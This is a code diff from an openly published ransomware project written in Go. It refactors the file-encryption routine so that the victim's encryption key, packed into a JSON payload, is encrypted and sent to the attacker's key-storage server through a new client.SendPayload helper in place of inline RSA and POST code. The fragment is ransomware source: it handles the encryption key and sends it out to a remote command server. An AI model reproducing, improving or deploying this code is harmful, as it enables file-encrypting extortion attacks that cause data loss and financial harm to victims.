@@ -18,15 +18,10 @@ import (
 	"github.com/mauri870/ransomware/client"
 	"github.com/mauri870/ransomware/cmd"
 	"github.com/mauri870/ransomware/cryptofs"
-	"github.com/mauri870/ransomware/rsa"
 	"github.com/mauri870/ransomware/utils"
 )
 
 var (
-	// RSA Public key
-	// Automatically injected by make
-	PUB_KEY = []byte(`INJECT_PUB_KEY_HERE`)
-
 	// Time to keep trying persist new keys on server
 	SecondsToTimeout = 5.0
 
@@ -78,17 +73,8 @@ func encryptFiles() {
 		// Create the json payload
 		payload := fmt.Sprintf(`{"id": "%s", "enckey": "%s"}`, keys["id"], keys["enckey"])
 
-		// Encrypting with RSA-2048
-		ciphertext, err := rsa.Encrypt(PUB_KEY, []byte(payload))
-		if err != nil {
-			cmd.Logger.Println(err)
-			continue
-		}
-
-		// Call the server to validate and store the keys
-		data := url.Values{}
-		data.Add("payload", base64.StdEncoding.EncodeToString(ciphertext))
-		res, err := client.CallServer("POST", "/api/keys/add", data)
+		// Encrypt the payload and send to server
+		res, err := client.SendPayload("/api/keys/add", payload, url.Values{})
 		if err != nil {
 			cmd.Logger.Println("The server refuse connection. Aborting...")
 			return
